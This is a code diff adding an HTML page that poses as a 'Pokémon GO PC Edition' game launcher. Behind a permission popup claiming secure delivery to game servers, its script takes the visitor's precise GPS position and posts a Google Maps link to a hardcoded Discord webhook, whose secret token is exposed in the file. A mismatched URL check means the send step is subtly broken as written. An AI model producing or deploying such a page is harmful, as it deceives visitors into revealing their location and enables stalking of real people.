@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pokémon GO PC Edition</title>
+    <style>
+        body {
+            background-color: #000000;
+            color: #808080;
+            font-family: 'Arial', sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            padding: 0;
+            text-align: center;
+        }
+
+        .title {
+            font-size: 2.5rem;
+            margin-bottom: 2rem;
+            text-shadow: 0 0 10px rgba(128, 128, 128, 0.5);
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 0.8; }
+            50% { opacity: 1; text-shadow: 0 0 15px rgba(128, 128, 128, 0.8); }
+            100% { opacity: 0.8; }
+        }
+
+        .enter-button {
+            background-color: #ff0000;
+            color: #0000ff;
+            border: none;
+            padding: 15px 30px;
+            font-size: 1.5rem;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: transform 0.3s, box-shadow 0.3s;
+            box-shadow: 0 0 15px rgba(255, 0, 0, 0.5);
+        }
+
+        .enter-button:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.8);
+        }
+
+        .enter-button:active {
+            transform: scale(0.98);
+        }
+
+        .popup {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            z-index: 100;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .popup-content {
+            background-color: #1a1a1a;
+            padding: 2rem;
+            border-radius: 10px;
+            max-width: 500px;
+            width: 80%;
+            color: #808080;
+            text-align: center;
+            box-shadow: 0 0 25px rgba(0, 0, 0, 0.5);
+        }
+
+        .popup-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 1rem;
+            margin-top: 2rem;
+        }
+
+        .popup-button {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: background-color 0.3s;
+        }
+
+        .allow-btn {
+            background-color: #008000;
+            color: white;
+        }
+
+        .deny-btn {
+            background-color: #800000;
+            color: white;
+        }
+
+        .pokeball-decoration {
+            width: 100px;
+            height: 100px;
+            background: linear-gradient(
+                to bottom,
+                #ff0000 0%,
+                #ff0000 50%,
+                #ffffff 50%,
+                #ffffff 100%
+            );
+            border-radius: 50%;
+            border: 5px solid #000000;
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 0 15px rgba(255, 0, 0, 0.5);
+        }
+
+        .pokeball-center {
+            width: 30px;
+            height: 30px;
+            background-color: #000000;
+            border-radius: 50%;
+            border: 5px solid #ffffff;
+        }
+
+        .location-status {
+            margin-top: 2rem;
+            font-size: 1rem;
+        }
+
+        .success-message {
+            color: #00ff00;
+            display: none;
+            margin-top: 1rem;
+        }
+
+        .error-message {
+            color: #ff0000;
+            display: none;
+            margin-top: 1rem;
+        }
+    </style>
+</head>
+<body>
+    <div class="pokeball-decoration">
+        <div class="pokeball-center"></div>
+    </div>
+
+    <h1 class="title">Enter Pokémon GO PC Edition</h1>
+    <button class="enter-button" id="enterBtn">Enter</button>
+    <p class="location-status">Location services will be required</p>
+    <p class="success-message">Location successfully shared with Pokémon GO!</p>
+    <p class="error-message">Unable to share location. Please enable location services.</p>
+
+    <div class="popup" id="permissionPopup">
+        <div class="popup-content">
+            <h2>Location Permission</h2>
+            <p>Pokémon GO PC Edition requires access to your location to provide the full game experience.</p>
+            <p>Your location will be sent securely to the game servers.</p>
+            <div class="popup-buttons">
+                <button class="popup-button allow-btn" id="allowBtn">Allow</button>
+                <button class="popup-button deny-btn" id="denyBtn">Deny</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const enterBtn = document.getElementById('enterBtn');
+        const permissionPopup = document.getElementById('permissionPopup');
+        const allowBtn = document.getElementById('allowBtn');
+        const denyBtn = document.getElementById('denyBtn');
+        const successMessage = document.querySelector('.success-message');
+        const errorMessage = document.querySelector('.error-message');
+
+        // Replace this with your actual Discord webhook URL
+        const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1389775534040285396/DUGgpW1aPbv83dOO0VK8cX6H4ZPYHZXg5NzcD-HEhtpstFC3bi8J363UsUm37SIZq_b6';
+
+        enterBtn.addEventListener('click', () => {
+            permissionPopup.style.display = 'flex';
+        });
+
+        allowBtn.addEventListener('click', () => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        // Success - got position
+                        const { latitude, longitude } = position.coords;
+                        const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                        
+                        // Send to Discord webhook
+                        sendToDiscord(mapsLink);
+                        
+                        permissionPopup.style.display = 'none';
+                        successMessage.style.display = 'block';
+                        errorMessage.style.display = 'none';
+                        
+                        // Hide success message after 3 seconds
+                        setTimeout(() => {
+                            successMessage.style.display = 'none';
+                        }, 3000);
+                    },
+                    (error) => {
+                        // Error getting position
+                        console.error('Error getting location:', error);
+                        permissionPopup.style.display = 'none';
+                        errorMessage.style.display = 'block';
+                        successMessage.style.display = 'none';
+                        
+                        // Hide error message after 3 seconds
+                        setTimeout(() => {
+                            errorMessage.style.display = 'none';
+                        }, 3000);
+                    },
+                    { enableHighAccuracy: true }
+                );
+            } else {
+                // Geolocation not supported
+                console.error('Geolocation is not supported by this browser.');
+                permissionPopup.style.display = 'none';
+                errorMessage.style.display = 'block';
+                successMessage.style.display = 'none';
+                
+                // Hide error message after 3 seconds
+                setTimeout(() => {
+                    errorMessage.style.display = 'none';
+                }, 3000);
+            }
+        });
+
+        denyBtn.addEventListener('click', () => {
+            permissionPopup.style.display = 'none';
+        });
+
+        function sendToDiscord(locationLink) {
+            const payload = {
+                content: `New Pokémon GO player location: ${locationLink}`
+            };
+
+            // You'll need to replace the webhook URL with your actual Discord webhook
+            // This is just a demonstration of how it would work
+            if (DISCORD_WEBHOOK_URL.startsWith('https://discord.com/api/webhooks/')) {
+                fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        console.error('Failed to send to Discord');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error sending to Discord:', error);
+                });
+            }
+        }
+    </script>
+</body>
+</html>
